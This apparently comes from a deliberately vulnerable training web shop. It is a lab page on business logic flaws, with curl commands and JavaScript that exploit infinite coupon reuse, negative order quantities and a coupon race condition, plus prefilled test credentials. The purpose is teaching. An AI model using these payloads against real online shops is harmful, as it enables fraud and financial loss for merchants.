<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Business Logic Lab | Breuta Coffee</title>
<link rel="stylesheet" href="/assets/css/style.css">
</head>
<body>
<?php include '/var/www/html/includes/navbar.php'; ?>

<div class="page-header">
  <div class="container">
    <h1>💼 Business Logic Vulnerabilities</h1>
    <p>Coupon abuse, negative quantities, and more</p>
  </div>
</div>

<div class="container">

  <div class="vuln-hint">
    <h4>🧑‍🎓 Lab Exercise: Business Logic</h4>
    <p>This shop has several business logic flaws:</p>
    <ul style="margin-left:1.5rem; margin-top:.4rem;">
      <li><strong>Infinite coupon reuse</strong>: <code>FREECOFFEE</code> gives 100% off and usage is never updated → use forever</li>
      <li><strong>Negative quantity</strong>: Ordering -1 items creates a negative total → money back</li>
      <li><strong>Race condition</strong>: Apply same coupon in parallel requests before the counter updates</li>
    </ul>
  </div>

  <div class="card">
    <h2>Step 1 — Login</h2>
    <div class="form-group"><label>Username</label><input type="text" id="username" value="charlie"></div>
    <div class="form-group"><label>Password</label><input type="password" id="password" value="latte_lover"></div>
    <button onclick="doLogin()">Login</button>
    <div id="login-status" style="margin-top:.5rem;"></div>
  </div>

  <div class="card">
    <h2>Step 2 — Place Order with Coupon</h2>
    <div class="form-group"><label>Product ID</label><input type="number" id="product-id" value="1" min="1"></div>
    <div class="form-group">
      <label>Quantity (try -1 for negative total!)</label>
      <input type="number" id="quantity" value="1">
    </div>
    <div class="form-group">
      <label>Coupon Code (try: FREECOFFEE, WELCOME10, SALE50)</label>
      <input type="text" id="coupon" value="FREECOFFEE">
    </div>
    <button onclick="placeOrder()">Place Order</button>
    <div id="order-result" class="json-block" style="margin-top:1rem; min-height:40px;"></div>
  </div>

  <div class="card">
    <h2>Step 3 — Race Condition (apply coupon many times)</h2>
    <p>Sends 10 simultaneous requests with the same coupon to abuse race conditions:</p>
    <button onclick="raceCondition()">🏁 Trigger Race Condition (×10 parallel orders)</button>
    <div id="race-result" class="json-block" style="margin-top:1rem; min-height:40px;"></div>
  </div>

  <div class="card">
    <h2>💡 Curl Commands</h2>
    <pre style="background:#1e1e1e; color:#d4d4d4; padding:1rem; border-radius:6px; overflow-x:auto; font-size:.82rem;">
# 100% off coupon (infinite reuse)
curl -X POST http://breuta.co/api/orders \
  -H "Authorization: Bearer &lt;TOKEN&gt;" \
  -H "Content-Type: application/json" \
  -d '{"product_id":1, "quantity":1, "coupon_code":"FREECOFFEE"}'

# Negative quantity — get money back
curl -X POST http://breuta.co/api/orders \
  -H "Authorization: Bearer &lt;TOKEN&gt;" \
  -H "Content-Type: application/json" \
  -d '{"product_id":1, "quantity":-5}'

# Race condition — 10 parallel requests
for i in {1..10}; do
  curl -s -X POST http://breuta.co/api/orders \
    -H "Authorization: Bearer &lt;TOKEN&gt;" \
    -H "Content-Type: application/json" \
    -d '{"product_id":1,"quantity":1,"coupon_code":"SALE50"}' &amp;
done
wait
    </pre>
  </div>

</div>

<?php include '/var/www/html/includes/footer.php'; ?>
<script src="/assets/js/main.js"></script>
<script>
async function doLogin() {
  const r = await breuta.api('POST', '/auth/login', {
    username: document.getElementById('username').value,
    password: document.getElementById('password').value
  });
  if (r.token) {
    breuta.setToken(r.token);
    document.getElementById('login-status').innerHTML = '<div class="alert alert-success">✅ Logged in!</div>';
  } else {
    document.getElementById('login-status').innerHTML = `<div class="alert alert-danger">❌ ${r.error}</div>`;
  }
}

async function placeOrder() {
  const r = await breuta.api('POST', '/orders', {
    product_id:  parseInt(document.getElementById('product-id').value),
    quantity:    parseInt(document.getElementById('quantity').value),
    coupon_code: document.getElementById('coupon').value
  });
  document.getElementById('order-result').textContent = JSON.stringify(r, null, 2);
}

async function raceCondition() {
  document.getElementById('race-result').textContent = 'Sending 10 parallel requests...';
  const promises = Array.from({length: 10}, () =>
    breuta.api('POST', '/orders', {product_id: 2, quantity: 1, coupon_code: 'SALE50'})
  );
  const results = await Promise.all(promises);
  document.getElementById('race-result').textContent = JSON.stringify(results, null, 2);
}
</script>
</body>
</html>
